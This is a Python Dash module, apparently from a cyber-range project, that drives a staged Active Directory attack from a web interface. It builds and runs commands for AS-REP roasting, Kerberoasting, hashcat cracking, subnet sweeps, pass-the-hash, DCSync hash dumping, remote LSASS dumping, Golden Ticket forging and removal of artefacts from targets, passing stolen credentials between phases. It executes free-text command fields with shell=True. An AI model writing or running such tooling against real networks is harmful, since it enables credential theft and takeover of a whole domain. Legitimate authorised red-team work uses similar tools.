"""
ui_ad_redops.py — AD Red Team Operations Pipeline
===================================================
4-phase automated red team pipeline driven by live Neo4j scan findings.

Tabs:
  ⚔️  Exploitation       — AS-REP Roast, Kerberoast, hash cracking
  🔀  Lateral Movement   — CME host enumeration, PTH, share hunting
  🏆  Post-Exploitation  — DCSync, LSASS dump, Golden Ticket
  📄  Reporting          — Full engagement summary + export
"""

import subprocess
import threading
import time
import datetime
import json as _json

import dash
from dash import html, dcc, callback
import dash_bootstrap_components as dbc
from dash.dependencies import Input, Output, State
from dash.exceptions import PreventUpdate

from cyber_range.services.ad_ldap_scanner import get_live_kpi
from cyber_range.services.neo4j_engine import neo4j

# ─────────────────────────────────────────────────────────────────────────────
# THEME (mirrors ui_bloodhound.py)
# ─────────────────────────────────────────────────────────────────────────────
BG_DARK   = "#1c1e26"
PANEL_BG  = "#232530"
TEXT_COL  = "#a2a5b5"
CYAN      = "#42b9f5"
RED       = "#f54254"
ORANGE    = "#f5a742"
GREEN     = "#11c26f"
PURPLE    = "#9e54d4"
CARD_STYLE = {"backgroundColor": PANEL_BG, "border": "1px solid #333", "borderRadius": "10px"}
INPUT_STYLE = {"backgroundColor": "#111", "color": "#fff", "border": "1px solid #444",
               "borderRadius": "6px", "fontSize": "0.82rem"}
LABEL_STYLE = {"color": TEXT_COL, "fontSize": "0.78rem", "marginBottom": "2px"}

# ─────────────────────────────────────────────────────────────────────────────
# JOB STORE  — { phase: {cmd, output, running, ts} }
# ─────────────────────────────────────────────────────────────────────────────
_JOB_STORE: dict = {}
_JOB_LOCK         = threading.Lock()


def _run_bg(phase: str, cmd: str):
    """Execute cmd in background, append stdout/stderr lines to _JOB_STORE."""
    with _JOB_LOCK:
        _JOB_STORE[phase] = {
            "cmd": cmd, "output": f"$ {cmd}\n", "running": True,
            "ts": datetime.datetime.now().isoformat()
        }
    try:
        proc = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1,
        )
        for line in proc.stdout:
            with _JOB_LOCK:
                _JOB_STORE[phase]["output"] += line
        proc.wait()
        rc = proc.returncode
        with _JOB_LOCK:
            _JOB_STORE[phase]["output"] += f"\n[Process exited with code {rc}]"
            _JOB_STORE[phase]["running"]  = False
    except Exception as e:
        with _JOB_LOCK:
            _JOB_STORE[phase]["output"] += f"\n[Error: {e}]"
            _JOB_STORE[phase]["running"]  = False


def _get_output(phase: str) -> str:
    with _JOB_LOCK:
        job = _JOB_STORE.get(phase, {})
    return job.get("output", "No output yet. Build a command and press ▶ Run.")


def _is_running(phase: str) -> bool:
    with _JOB_LOCK:
        return _JOB_STORE.get(phase, {}).get("running", False)


# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def _section_header(icon, title, subtitle=""):
    return html.Div([
        html.Span(icon, style={"fontSize": "1.3rem", "marginRight": "8px"}),
        html.Span(title, style={"color": "#fff", "fontWeight": "bold", "fontSize": "1rem"}),
        html.Span(f"  {subtitle}", style={"color": TEXT_COL, "fontSize": "0.78rem"}) if subtitle else None,
    ], style={"marginBottom": "12px"})


def _cmd_block(cmd_id, label, default_val="", placeholder="", height="80px", readonly=False):
    """Labelled textarea for a command."""
    return html.Div([
        html.Label(label, style=LABEL_STYLE),
        dcc.Textarea(
            id=cmd_id,
            value=default_val,
            placeholder=placeholder,
            readOnly=readonly,
            style={**INPUT_STYLE, "width": "100%", "height": height,
                   "fontFamily": "monospace", "resize": "vertical"},
        ),
    ], style={"marginBottom": "10px"})


def _run_btn(btn_id, label="▶ Run Command"):
    return dbc.Button([
        html.I(className="bi bi-play-fill me-2"),
        label,
    ], id=btn_id, color="danger", size="sm",
       style={"fontWeight": "bold", "letterSpacing": "0.03em"})


def _output_pane(out_id, poll_id):
    return html.Div([
        dcc.Interval(id=poll_id, interval=1500, n_intervals=0, disabled=False),
        html.Label("Output", style={**LABEL_STYLE, "marginTop": "14px"}),
        dcc.Textarea(
            id=out_id,
            value="",
            readOnly=True,
            style={**INPUT_STYLE, "width": "100%", "height": "280px",
                   "fontFamily": "monospace", "fontSize": "0.78rem",
                   "color": GREEN, "resize": "vertical"},
        ),
    ])


def _phase_card(*children):
    return dbc.Card(dbc.CardBody(list(children), style={"padding": "20px"}),
                    style={**CARD_STYLE, "marginBottom": "16px"})


def _get_flagged(vuln_type: str) -> list:
    """Fetch flagged entities from Neo4j for auto-filling commands."""
    queries = {
        "asrep": ("MATCH (u:User) WHERE u.asrep_roastable = true "
                  "RETURN u.name AS name, u.domain AS domain"),
        "kerberoast": ("MATCH (u:User) WHERE u.kerberoastable = true "
                       "RETURN u.name AS name, u.domain AS domain, u.spn AS spn"),
        "unconstrained": ("MATCH (c:Computer) WHERE c.unconstrained_delegation = true "
                          "RETURN c.name AS name, c.domain AS domain"),
    }
    try:
        rows = neo4j.run_query(queries.get(vuln_type, "RETURN 1")) or []
        return rows
    except Exception:
        return []


def _normalize_domain(domain: str) -> str:
    """Expand a short NetBIOS name to FQDN.
    e.g.  'Expedite' -> 'EXPEDITE.LOCAL'
    Tries Neo4j first for the real FQDN, then falls back to <NAME>.local."""
    if not domain or domain in ("DOMAIN", ""):
        return "DOMAIN"
    if "." in domain:          # already FQDN
        return domain.upper()
    # Try to resolve from Neo4j — look for a user whose domain contains this name
    try:
        rows = neo4j.run_query(
            "MATCH (u:User) WHERE toLower(u.domain) CONTAINS toLower($d) "
            "RETURN u.domain AS domain LIMIT 1",
            {"d": domain}
        ) or []
        if rows:
            return rows[0].get("domain", domain).upper()
    except Exception:
        pass
    return f"{domain.upper()}.LOCAL"


def _impacket(tool: str) -> str:
    """Return the correct executable for an impacket tool.
    Checks: impacket-ToolName (apt install), then ToolName.py in venv."""
    import shutil
    # System-installed impacket (apt): named impacket-GetNPUsers etc.
    p = shutil.which(f"impacket-{tool}")
    if p:
        return p
    # Venv-installed impacket: .py scripts in venv/bin
    p = shutil.which(tool)
    if p:
        return p
    venv_py = f"/opt/vuln_intel/venv/bin/{tool}.py"
    return venv_py


def _impacket_cmd(tool: str, args: str) -> str:
    """Build a shell command for an impacket tool with the correct invocation."""
    binary = _impacket(tool)
    # System impacket binaries (/usr/bin/impacket-*) are executable — no python3 prefix
    if binary.startswith("/usr/bin/") or (not binary.endswith(".py")):
        return f"{binary} {args}"
    # .py scripts need python3
    return f"python3 {binary} {args}"


# ─────────────────────────────────────────────────────────────────────────────
# TAB LAYOUTS
# ─────────────────────────────────────────────────────────────────────────────

def _build_exploitation_tab():
    return html.Div([
        dbc.Row([
            dbc.Col([
                # ── AS-REP Roasting ─────────────────────────────────────────
                _phase_card(
                    _section_header("🟠", "AS-REP Roasting", "Extract TGT hashes from accounts with pre-auth disabled"),
                    dbc.Row([
                        dbc.Col(_cmd_block("ops-asrep-cmd", "GetNPUsers Command",
                                           placeholder="Auto-filled from scan — click 'Load Targets' first",
                                           height="70px"), width=9),
                        dbc.Col([
                            dbc.Button("⟳ Load Targets", id="ops-asrep-load-btn", color="outline-info",
                                       size="sm", className="w-100 mb-2"),
                            _run_btn("ops-asrep-run-btn", "▶ Run"),
                        ], width=3, style={"paddingTop": "18px"}),
                    ]),
                    html.Div(id="ops-asrep-targets-summary", style={"color": TEXT_COL, "fontSize": "0.78rem",
                                                                     "marginBottom": "8px"}),
                    _output_pane("ops-asrep-output", "ops-asrep-poll"),
                ),

                # ── Kerberoasting ────────────────────────────────────────────
                _phase_card(
                    _section_header("🟡", "Kerberoasting", "Request TGS tickets for SPN accounts"),
                    dbc.Row([
                        dbc.Col(_cmd_block("ops-kerb-cmd", "GetUserSPNs Command",
                                           placeholder="Auto-filled from scan — click 'Load Targets' first",
                                           height="70px"), width=9),
                        dbc.Col([
                            dbc.Button("⟳ Load Targets", id="ops-kerb-load-btn", color="outline-info",
                                       size="sm", className="w-100 mb-2"),
                            _run_btn("ops-kerb-run-btn", "▶ Run"),
                        ], width=3, style={"paddingTop": "18px"}),
                    ]),
                    _output_pane("ops-kerb-output", "ops-kerb-poll"),
                ),
            ], width=8),

            dbc.Col([
                # ── Hash Cracking ───────────────────────────────────────────
                _phase_card(
                    _section_header("🔓", "Hash Cracking", "Offline crack with hashcat"),
                    html.Label("Hash File", style=LABEL_STYLE),
                    dbc.Input(id="ops-hashfile",
                              value=next(
                                  (p for p in ["/tmp/hashes.kerb", "/tmp/hashes.asreproast"]
                                   if __import__("os").path.exists(p)),
                                  "/tmp/hashes.kerb"
                              ),
                              style={**INPUT_STYLE, "marginBottom": "8px"}),
                    html.Label("Mode", style=LABEL_STYLE),
                    dbc.Select(id="ops-hash-mode", options=[
                        {"label": "13100 — TGS-REP (Kerberoast)",  "value": "13100"},
                        {"label": "18200 — AS-REP (Kerberos 5)", "value": "18200"},
                        {"label": "1000  — NTLM",                  "value": "1000"},
                    ],
                    value="13100" if __import__("os").path.exists("/tmp/hashes.kerb") else "18200",
                    style={**INPUT_STYLE, "marginBottom": "8px"}),
                    html.Label("Wordlist", style=LABEL_STYLE),
                    dbc.Input(id="ops-wordlist",
                              value=next((p for p in [
                                  "/usr/share/wordlists/rockyou.txt",
                                  "/usr/share/wordlists/rockyou.txt.gz",
                              ] if __import__("os").path.exists(p)),
                              "/usr/share/wordlists/rockyou.txt"),
                              style={**INPUT_STYLE, "marginBottom": "10px"}),
                    _run_btn("ops-crack-run-btn", "▶ Crack"),
                    _output_pane("ops-crack-output", "ops-crack-poll"),
                ),

                # ── Credential Store ─────────────────────────────────────────
                _phase_card(
                    _section_header("🔑", "Credential Store", "Paste cracked creds here for use in next phases"),
                    html.Label("Username", style=LABEL_STYLE),
                    dbc.Input(id="ops-cred-user", placeholder="svc_sql",
                              style={**INPUT_STYLE, "marginBottom": "6px"}),
                    html.Label("Password / Hash", style=LABEL_STYLE),
                    dbc.Input(id="ops-cred-pass", placeholder="Password1 or NTLM:hash",
                              type="password",
                              style={**INPUT_STYLE, "marginBottom": "6px"}),
                    html.Label("DC IP", style=LABEL_STYLE),
                    dbc.Input(id="ops-cred-dcip", placeholder="192.168.1.10",
                              style={**INPUT_STYLE, "marginBottom": "6px"}),
                    html.Label("Domain", style=LABEL_STYLE),
                    dbc.Input(id="ops-cred-domain", placeholder="expedite.local",
                              style={**INPUT_STYLE, "marginBottom": "10px"}),
                    dbc.Button("💾 Save for Phase 2→4", id="ops-cred-save-btn",
                               color="success", size="sm", className="w-100"),
                    html.Div(id="ops-cred-save-status", style={"color": GREEN, "fontSize": "0.78rem",
                                                                "marginTop": "6px", "textAlign": "center"}),
                ),
            ], width=4),
        ]),
    ], style={"padding": "20px"})


def _build_lateral_tab():
    return html.Div([
        html.P("Uses credentials saved in Phase 1. Run CME host sweep, then select a target for deeper access.",
               style={"color": TEXT_COL, "fontSize": "0.85rem", "marginBottom": "16px"}),
        dbc.Row([
            dbc.Col([
                _phase_card(
                    _section_header("🌐", "Network Sweep", "Enumerate reachable hosts with CrackMapExec"),
                    dbc.Row([
                        dbc.Col(_cmd_block("ops-sweep-cmd", "CME SMB Sweep Command",
                                           placeholder="nxc smb 192.168.1.0/24 -u user -p pass",
                                           height="70px"), width=9),
                        dbc.Col([
                            dbc.Button("⟳ Auto-Fill", id="ops-sweep-fill-btn",
                                       color="outline-info", size="sm", className="w-100 mb-2"),
                            _run_btn("ops-sweep-run-btn", "▶ Sweep"),
                        ], width=3, style={"paddingTop": "18px"}),
                    ]),
                    _output_pane("ops-sweep-output", "ops-sweep-poll"),
                ),

                _phase_card(
                    _section_header("🔐", "Pass-the-Hash", "Authenticate with NTLM hash — no plaintext needed"),
                    _cmd_block("ops-pth-cmd", "PTH Command (CME)",
                               placeholder="nxc smb 192.168.1.0/24 -u admin -H NTLM_HASH --local-auth",
                               height="70px"),
                    dbc.Row([
                        dbc.Col(_run_btn("ops-pth-run-btn", "▶ Run PTH"), width=3),
                        dbc.Col(dbc.Button("⟳ Auto-Fill from Cred Store", id="ops-pth-fill-btn",
                                           color="outline-info", size="sm"), width=4),
                    ]),
                    _output_pane("ops-pth-output", "ops-pth-poll"),
                ),
            ], width=7),

            dbc.Col([
                _phase_card(
                    _section_header("📂", "Share Hunting", "Find accessible SMB shares"),
                    _cmd_block("ops-shares-cmd", "CME Shares Command",
                               placeholder="nxc smb TARGET -u user -p pass --shares",
                               height="70px"),
                    _run_btn("ops-shares-run-btn", "▶ Enumerate Shares"),
                    _output_pane("ops-shares-output", "ops-shares-poll"),
                ),

                _phase_card(
                    _section_header("👤", "Session Enum", "Find logged-in users on targets"),
                    _cmd_block("ops-sessions-cmd", "CME Sessions / LoggedOn",
                               placeholder="nxc smb TARGET -u user -p pass --smb-sessions --loggedon-users",
                               height="70px"),
                    _run_btn("ops-sessions-run-btn", "▶ Get Sessions"),
                    _output_pane("ops-sessions-output", "ops-sessions-poll"),
                ),
            ], width=5),
        ]),
    ], style={"padding": "20px"})


def _build_postex_tab():
    return html.Div([
        html.P("High-impact actions requiring valid credentials. These will generate significant domain controller logs.",
               style={"color": RED, "fontSize": "0.82rem", "marginBottom": "16px",
                      "border": f"1px solid {RED}", "padding": "8px 12px", "borderRadius": "6px",
                      "backgroundColor": RED + "1a"}),
        dbc.Row([
            dbc.Col([
                _phase_card(
                    _section_header("🔄", "DCSync — Dump All Hashes", "Replicates AD database via MS-DRSR protocol"),
                    dbc.Row([
                        dbc.Col(_cmd_block("ops-dcsync-cmd", "secretsdump Command",
                                           placeholder="secretsdump.py domain/user:pass@DC_IP",
                                           height="70px"), width=9),
                        dbc.Col([
                            dbc.Button("⟳ Auto-Fill", id="ops-dcsync-fill-btn",
                                       color="outline-info", size="sm", className="w-100 mb-2"),
                            _run_btn("ops-dcsync-run-btn", "▶ DCSync"),
                        ], width=3, style={"paddingTop": "18px"}),
                    ]),
                    _output_pane("ops-dcsync-output", "ops-dcsync-poll"),
                ),

                _phase_card(
                    _section_header("🎫", "Golden Ticket", "Forge a TGT valid for any domain service"),
                    dbc.Row([
                        dbc.Col([
                            html.Label("KRBTGT Hash", style=LABEL_STYLE),
                            dbc.Input(id="ops-gt-hash", placeholder="NTLM hash from DCSync",
                                      style={**INPUT_STYLE, "marginBottom": "6px"}),
                        ], width=6),
                        dbc.Col([
                            html.Label("Domain SID", style=LABEL_STYLE),
                            dbc.Input(id="ops-gt-sid", placeholder="S-1-5-21-...",
                                      style={**INPUT_STYLE, "marginBottom": "6px"}),
                        ], width=6),
                    ]),
                    _cmd_block("ops-gt-cmd", "ticketer Command",
                               placeholder="ticketer.py will be auto-built from hash + SID above",
                               height="60px"),
                    dbc.Row([
                        dbc.Col(dbc.Button("⟳ Build Command", id="ops-gt-build-btn",
                                           color="outline-info", size="sm"), width=4),
                        dbc.Col(_run_btn("ops-gt-run-btn", "▶ Forge Ticket"), width=3),
                    ]),
                    _output_pane("ops-gt-output", "ops-gt-poll"),
                ),
            ], width=7),

            dbc.Col([
                _phase_card(
                    _section_header("🧠", "LSASS Dump", "Extract credentials from memory remotely"),
                    _cmd_block("ops-lsass-cmd", "CME lsassy Module",
                               placeholder="nxc smb TARGET -u user -p pass -M lsassy",
                               height="70px"),
                    dbc.Row([
                        dbc.Col(dbc.Button("⟳ Auto-Fill", id="ops-lsass-fill-btn",
                                           color="outline-info", size="sm"), width=4),
                        dbc.Col(_run_btn("ops-lsass-run-btn", "▶ Dump LSASS"), width=4),
                    ]),
                    _output_pane("ops-lsass-output", "ops-lsass-poll"),
                ),

                _phase_card(
                    _section_header("🗑️", "Cleanup", "Remove artefacts left on target systems"),
                    _cmd_block("ops-cleanup-cmd", "Cleanup Command",
                               placeholder="nxc smb TARGET -u user -p pass -x 'del C:\\\\Windows\\\\Temp\\\\lsassy*'",
                               height="70px"),
                    _run_btn("ops-cleanup-run-btn", "▶ Run Cleanup"),
                    _output_pane("ops-cleanup-output", "ops-cleanup-poll"),
                ),
            ], width=5),
        ]),
    ], style={"padding": "20px"})


def _build_reporting_tab():
    return html.Div([
        dbc.Row([
            dbc.Col([
                _phase_card(
                    _section_header("📋", "Engagement Report", "Auto-generated from all phase outputs"),
                    dbc.Row([
                        dbc.Col(dbc.Button("⟳ Generate Report", id="ops-report-gen-btn",
                                           color="primary", size="sm"), width=4),
                        dbc.Col(dbc.Button("📋 Copy to Clipboard", id="ops-report-copy-btn",
                                           color="outline-secondary", size="sm"), width=4),
                        dbc.Col(dbc.Button("💾 Download .txt", id="ops-report-download-btn",
                                           color="outline-success", size="sm"), width=4),
                    ], className="mb-3"),
                    dcc.Download(id="ops-report-download"),
                    dcc.Textarea(
                        id="ops-report-txt",
                        readOnly=True,
                        value="Click 'Generate Report' to compile findings from all phases.",
                        style={**INPUT_STYLE, "width": "100%", "height": "600px",
                               "fontFamily": "monospace", "fontSize": "0.78rem",
                               "color": GREEN, "resize": "vertical"},
                    ),
                ),
            ], width=8),

            dbc.Col([
                _phase_card(
                    _section_header("📊", "Engagement Stats"),
                    html.Div(id="ops-report-stats"),
                ),
                _phase_card(
                    _section_header("⏱️", "Phase Timeline"),
                    html.Div(id="ops-report-timeline"),
                ),
            ], width=4),
        ]),
    ], style={"padding": "20px"})


# ─────────────────────────────────────────────────────────────────────────────
# SHARED CREDENTIAL STORE (dcc.Store component — add to layout)
# ─────────────────────────────────────────────────────────────────────────────

CRED_STORE = dcc.Store(id="ops-cred-store", storage_type="session", data={})


# ─────────────────────────────────────────────────────────────────────────────
# MAIN TABS LAYOUT  (returned by layout_redops_tabs())
# ─────────────────────────────────────────────────────────────────────────────

def layout_redops_tabs():
    """The 4 red-team phase tabs as a dbc.Tabs component."""
    return dbc.Tabs([
        dbc.Tab(_build_exploitation_tab(),
                label="⚔️ Exploitation",
                tab_id="redops-tab-exploit",
                label_style={"color": RED,    "fontWeight": "600"},
                active_label_style={"color": "#fff", "fontWeight": "bold"}),
        dbc.Tab(_build_lateral_tab(),
                label="🔀 Lateral Movement",
                tab_id="redops-tab-lateral",
                label_style={"color": ORANGE, "fontWeight": "600"},
                active_label_style={"color": "#fff", "fontWeight": "bold"}),
        dbc.Tab(_build_postex_tab(),
                label="🏆 Post-Exploitation",
                tab_id="redops-tab-postex",
                label_style={"color": PURPLE, "fontWeight": "600"},
                active_label_style={"color": "#fff", "fontWeight": "bold"}),
        dbc.Tab(_build_reporting_tab(),
                label="📄 Reporting",
                tab_id="redops-tab-report",
                label_style={"color": GREEN,  "fontWeight": "600"},
                active_label_style={"color": "#fff", "fontWeight": "bold"}),
    ], id="redops-tabs", active_tab="redops-tab-exploit",
       style={"borderBottom": f"1px solid #333", "backgroundColor": PANEL_BG})


# ─────────────────────────────────────────────────────────────────────────────
# CALLBACKS
# ─────────────────────────────────────────────────────────────────────────────

# ── Save credentials ───────────────────────────────────────────────────────
@callback(
    Output("ops-cred-store",       "data"),
    Output("ops-cred-save-status", "children"),
    Input("ops-cred-save-btn", "n_clicks"),
    State("ops-cred-user",   "value"),
    State("ops-cred-pass",   "value"),
    State("ops-cred-dcip",   "value"),
    State("ops-cred-domain", "value"),
    prevent_initial_call=True,
)
def save_creds(n, user, password, dcip, domain):
    if not n: raise PreventUpdate
    creds = {"user": user or "", "pass": password or "", "dcip": dcip or "", "domain": domain or ""}
    return creds, f"✅ Saved at {datetime.datetime.now().strftime('%H:%M:%S')}"


# ── Load AS-REP targets ─────────────────────────────────────────────────────
@callback(
    Output("ops-asrep-cmd",              "value"),
    Output("ops-asrep-targets-summary",  "children"),
    Input("ops-asrep-load-btn", "n_clicks"),
    State("ops-cred-dcip",   "value"),
    State("ops-cred-domain", "value"),
    State("ops-cred-user",   "value"),
    State("ops-cred-pass",   "value"),
    prevent_initial_call=True,
)
def load_asrep_targets(n, dcip, domain, user, password):
    if not n: raise PreventUpdate
    rows   = _get_flagged("asrep")
    dcip   = dcip   or "DC_IP"
    domain = _normalize_domain(domain)     # expand 'Expedite' → 'EXPEDITE.LOCAL'
    tool   = _impacket("GetNPUsers")
    if rows:
        users = ",".join(r.get("name", "user").split("@")[0] for r in rows)
        import tempfile
        tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, prefix="/tmp/asrep_")
        for r in rows:
            tmp.write(r.get("name", "").split("@")[0] + "\n")
        tmp.close()
        cmd = _impacket_cmd("GetNPUsers",
                            f"{domain}/ -usersfile {tmp.name} -no-pass -dc-ip {dcip} "
                            f"-outputfile /tmp/hashes.asreproast -format hashcat")
        summary = f"✅ {len(rows)} AS-REP targets loaded: {users}"
    else:
        cmd = _impacket_cmd("GetNPUsers",
                            f"{domain}/ -usersfile /tmp/asrep_users.txt -no-pass -dc-ip {dcip} "
                            f"-outputfile /tmp/hashes.asreproast -format hashcat")
        summary = "⚠️ No AS-REP targets in Neo4j — run 'Scan AD Server' first, or edit command manually."
    return cmd, summary


# ── Run AS-REP Roasting ─────────────────────────────────────────────────────
@callback(
    Output("ops-asrep-output", "value", allow_duplicate=True),
    Output("ops-hashfile",     "value", allow_duplicate=True),
    Output("ops-hash-mode",    "value", allow_duplicate=True),
    Input("ops-asrep-run-btn", "n_clicks"),
    State("ops-asrep-cmd",    "value"),
    prevent_initial_call=True,
)
def run_asrep(n, cmd):
    if not n or not cmd: raise PreventUpdate
    threading.Thread(target=_run_bg, args=("asrep", cmd), daemon=True).start()
    return f"$ {cmd}\n[Starting…]", "/tmp/hashes.asreproast", "18200"


@callback(
    Output("ops-asrep-output", "value"),
    Input("ops-asrep-poll",    "n_intervals"),
    prevent_initial_call=False,
)
def poll_asrep(n):
    return _get_output("asrep")


# ── Load Kerberoast targets ─────────────────────────────────────────────────
@callback(
    Output("ops-kerb-cmd", "value"),
    Input("ops-kerb-load-btn", "n_clicks"),
    State("ops-cred-dcip",   "value"),
    State("ops-cred-domain", "value"),
    State("ops-cred-user",   "value"),
    State("ops-cred-pass",   "value"),
    prevent_initial_call=True,
)
def load_kerb_targets(n, dcip, domain, user, password):
    if not n: raise PreventUpdate
    rows     = _get_flagged("kerberoast")
    dcip     = dcip     or "DC_IP"
    domain   = _normalize_domain(domain)   # expand 'Expedite' → 'EXPEDITE.LOCAL'
    user     = user     or "USERNAME"
    password = password or "PASSWORD"
    cmd = _impacket_cmd("GetUserSPNs",
                        f"{domain}/{user}:{password} -dc-ip {dcip} -request "
                        f"-outputfile /tmp/hashes.kerb")
    return cmd


# ── Run Kerberoasting ────────────────────────────────────────────────────────
@callback(
    Output("ops-kerb-output", "value", allow_duplicate=True),
    Output("ops-hashfile",    "value", allow_duplicate=True),
    Output("ops-hash-mode",   "value", allow_duplicate=True),
    Input("ops-kerb-run-btn", "n_clicks"),
    State("ops-kerb-cmd",    "value"),
    prevent_initial_call=True,
)
def run_kerb(n, cmd):
    if not n or not cmd: raise PreventUpdate
    threading.Thread(target=_run_bg, args=("kerb", cmd), daemon=True).start()
    return f"$ {cmd}\n[Starting…]", "/tmp/hashes.kerb", "13100"


@callback(
    Output("ops-kerb-output", "value"),
    Input("ops-kerb-poll",    "n_intervals"),
    prevent_initial_call=False,
)
def poll_kerb(n):
    return _get_output("kerb")


# ── Hash Cracking ────────────────────────────────────────────────────────────
@callback(
    Output("ops-crack-output", "value", allow_duplicate=True),
    Input("ops-crack-run-btn", "n_clicks"),
    State("ops-hashfile",      "value"),
    State("ops-hash-mode",     "value"),
    State("ops-wordlist",      "value"),
    prevent_initial_call=True,
)
def run_crack(n, hashfile, mode, wordlist):
    if not n: raise PreventUpdate
    # Auto-extract rockyou.txt.gz if plain version missing
    import os, subprocess as sp
    if wordlist and wordlist.endswith(".gz") and os.path.exists(wordlist):
        plain = wordlist[:-3]
        if not os.path.exists(plain):
            sp.run(["gunzip", "-k", wordlist], capture_output=True)
        wordlist = plain
    elif wordlist and not os.path.exists(wordlist):
        gz = wordlist + ".gz"
        if os.path.exists(gz):
            plain = wordlist
            sp.run(["gunzip", "-k", gz], capture_output=True)
    cmd = f"hashcat -m {mode} {hashfile} {wordlist} --force --status"
    threading.Thread(target=_run_bg, args=("crack", cmd), daemon=True).start()
    return f"$ {cmd}\n[Starting…]"


@callback(
    Output("ops-crack-output", "value"),
    Input("ops-crack-poll",    "n_intervals"),
    prevent_initial_call=False,
)
def poll_crack(n):
    return _get_output("crack")


# ── Lateral: sweep auto-fill ─────────────────────────────────────────────────
@callback(
    Output("ops-sweep-cmd", "value"),
    Input("ops-sweep-fill-btn", "n_clicks"),
    State("ops-cred-store",     "data"),
    prevent_initial_call=True,
)
def fill_sweep(n, creds):
    if not n: raise PreventUpdate
    creds = creds or {}
    user   = creds.get("user", "USER")
    pw     = creds.get("pass", "PASS")
    dcip   = creds.get("dcip", "192.168.1.0")
    subnet = ".".join(dcip.split(".")[:3]) + ".0/24" if dcip and dcip != "DC_IP" else "192.168.1.0/24"
    return f"nxc smb {subnet} -u '{user}' -p '{pw}'"


@callback(
    Output("ops-sweep-output", "value", allow_duplicate=True),
    Input("ops-sweep-run-btn", "n_clicks"),
    State("ops-sweep-cmd",    "value"),
    prevent_initial_call=True,
)
def run_sweep(n, cmd):
    if not n or not cmd: raise PreventUpdate
    threading.Thread(target=_run_bg, args=("sweep", cmd), daemon=True).start()
    return f"$ {cmd}\n[Starting…]"


@callback(
    Output("ops-sweep-output", "value"),
    Input("ops-sweep-poll",    "n_intervals"),
    prevent_initial_call=False,
)
def poll_sweep(n): return _get_output("sweep")


# ── PTH auto-fill ─────────────────────────────────────────────────────────
@callback(
    Output("ops-pth-cmd", "value"),
    Input("ops-pth-fill-btn", "n_clicks"),
    State("ops-cred-store",   "data"),
    prevent_initial_call=True,
)
def fill_pth(n, creds):
    if not n: raise PreventUpdate
    creds = creds or {}
    user   = creds.get("user",   "USER")
    pw     = creds.get("pass",   "HASH")
    dcip   = creds.get("dcip",   "192.168.1.0")
    subnet = ".".join(dcip.split(".")[:3]) + ".0/24" if dcip and dcip != "DC_IP" else "192.168.1.0/24"
    return f"nxc smb {subnet} -u '{user}' -H '{pw}' --local-auth"


@callback(
    Output("ops-pth-output", "value", allow_duplicate=True),
    Input("ops-pth-run-btn", "n_clicks"),
    State("ops-pth-cmd",    "value"),
    prevent_initial_call=True,
)
def run_pth(n, cmd):
    if not n or not cmd: raise PreventUpdate
    threading.Thread(target=_run_bg, args=("pth", cmd), daemon=True).start()
    return f"$ {cmd}\n[Starting…]"


@callback(
    Output("ops-pth-output", "value"),
    Input("ops-pth-poll",    "n_intervals"),
    prevent_initial_call=False,
)
def poll_pth(n): return _get_output("pth")


# Simple run + poll pairs for shares / sessions / cleanup ────────────────────
for _phase, _in, _out, _poll in [
    ("shares",   "ops-shares-run-btn",   "ops-shares-output",   "ops-shares-poll"),
    ("sessions", "ops-sessions-run-btn", "ops-sessions-output", "ops-sessions-poll"),
    ("cleanup",  "ops-cleanup-run-btn",  "ops-cleanup-output",  "ops-cleanup-poll"),
]:
    # closure captures _phase correctly
    def _make_run(ph):
        @callback(
            Output(_out, "value", allow_duplicate=True),
            Input(_in,   "n_clicks"),
            State(_out.replace("-output", "-cmd"), "value"),
            prevent_initial_call=True,
        )
        def _cb(n, cmd, _ph=ph):
            if not n or not cmd: raise PreventUpdate
            threading.Thread(target=_run_bg, args=(_ph, cmd), daemon=True).start()
            return f"$ {cmd}\n[Starting…]"
        return _cb

    def _make_poll(ph, out_id, poll_id):
        @callback(
            Output(out_id,  "value"),
            Input(poll_id,  "n_intervals"),
            prevent_initial_call=False,
        )
        def _cb(n, _ph=ph): return _get_output(_ph)
        return _cb

    _make_run(_phase)
    _make_poll(_phase, _out, _poll)


# ── Post-ex: DCSync auto-fill ────────────────────────────────────────────────
@callback(
    Output("ops-dcsync-cmd", "value"),
    Input("ops-dcsync-fill-btn", "n_clicks"),
    State("ops-cred-store",      "data"),
    prevent_initial_call=True,
)
def fill_dcsync(n, creds):
    if not n: raise PreventUpdate
    creds  = creds or {}
    user   = creds.get("user",   "USER")
    pw     = creds.get("pass",   "PASS")
    domain = creds.get("domain", "DOMAIN")
    dcip   = creds.get("dcip",   "DC_IP")
    tool   = _impacket("secretsdump")
    return _impacket_cmd("secretsdump", f"{domain}/{user}:'{pw}'@{dcip}")


@callback(
    Output("ops-dcsync-output", "value", allow_duplicate=True),
    Input("ops-dcsync-run-btn", "n_clicks"),
    State("ops-dcsync-cmd",    "value"),
    prevent_initial_call=True,
)
def run_dcsync(n, cmd):
    if not n or not cmd: raise PreventUpdate
    threading.Thread(target=_run_bg, args=("dcsync", cmd), daemon=True).start()
    return f"$ {cmd}\n[Starting…]"


@callback(
    Output("ops-dcsync-output", "value"),
    Input("ops-dcsync-poll",    "n_intervals"),
    prevent_initial_call=False,
)
def poll_dcsync(n): return _get_output("dcsync")


# ── Golden Ticket build + run ────────────────────────────────────────────────
@callback(
    Output("ops-gt-cmd", "value"),
    Input("ops-gt-build-btn", "n_clicks"),
    State("ops-gt-hash",      "value"),
    State("ops-gt-sid",       "value"),
    State("ops-cred-domain",  "value"),
    prevent_initial_call=True,
)
def build_gt(n, hash_val, sid, domain):
    if not n: raise PreventUpdate
    tool   = _impacket("ticketer")
    domain = domain  or "DOMAIN"
    hash_val = hash_val or "KRBTGT_HASH"
    sid    = sid     or "S-1-5-21-XXXXX"
    return _impacket_cmd("ticketer",
                         f"-nthash {hash_val} -domain-sid {sid} -domain {domain} administrator")


@callback(
    Output("ops-gt-output", "value", allow_duplicate=True),
    Input("ops-gt-run-btn", "n_clicks"),
    State("ops-gt-cmd",    "value"),
    prevent_initial_call=True,
)
def run_gt(n, cmd):
    if not n or not cmd: raise PreventUpdate
    threading.Thread(target=_run_bg, args=("gt", cmd), daemon=True).start()
    return f"$ {cmd}\n[Starting…]"


@callback(
    Output("ops-gt-output", "value"),
    Input("ops-gt-poll",    "n_intervals"),
    prevent_initial_call=False,
)
def poll_gt(n): return _get_output("gt")


